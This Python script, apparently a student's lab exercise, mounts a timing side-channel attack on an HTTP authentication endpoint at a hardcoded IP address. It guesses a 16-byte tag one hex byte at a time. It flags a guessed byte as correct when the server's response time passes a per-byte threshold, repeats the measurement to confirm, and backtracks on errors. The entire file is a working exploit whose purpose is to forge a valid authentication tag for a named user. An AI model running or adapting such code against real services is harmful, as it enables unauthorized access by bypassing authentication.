import requests
import time

def buildTag(tags):
    resultTag = ""
    for tag in tags:
        resultTag += tag
    return resultTag

def testTag(tag):
    totUrl = url + tag
    result = requests.get(totUrl).elapsed.total_seconds()
    print("The Time :" + str(result) + " for tag : " + tag)
    return result

def testTagTimes(tag, numberOfTries):
    totUrl = url + tag
    result = requests.get(totUrl).elapsed.total_seconds()
    for x in range(numberOfTries - 1):
        time = requests.get(totUrl).elapsed.total_seconds()
        if time < result:
            result = time
    print("The lowest result of " + str(numberOfTries) + "is " + str(result))
    return result

delay = "60"
delayInt = 0.060
user = "joarkarl100"
url = "http://130.243.27.198/auth/" + delay + "/" + user + "/"
averageCheckNumber = 5

tags = ["00" for x in range(16)]
foundI = 0
foundJ = 0

x = 0
while x < 16:
    found = 0
    i = 0
    while i < 16:
        j = 0
        while j < 16:
            if found == 0:
                partOfTag = (hex(i)[2] + hex(j)[2])
                tags[x] = partOfTag
                thisTime = testTag(buildTag(tags))
                print(str(thisTime) + "     " +  str((delayInt * (x + 1))))
                if thisTime > (delayInt * (x + 1)):
                    #Calculate the lowest time of x amount of tries to make sure it is right
                    thisTime = testTagTimes(buildTag(tags), averageCheckNumber)
                    if thisTime > (delayInt * (x + 1)):
                        print ("Found " + partOfTag + " as index " + str(x) + " of tag")
                        found = 1
                        foundI = i
                        foundJ = j
                if (thisTime < (delayInt * (x))) & (x > 0):
                    print("Something went wrong decrementing x by one ")

                    tags[x] = "00"
                    x = x - 1
                    i = foundI
                    j = foundJ

            j = j + 1
        i = i + 1
    x = x + 1

print("    ")
print(buildTag(tags))
print("done 😀")
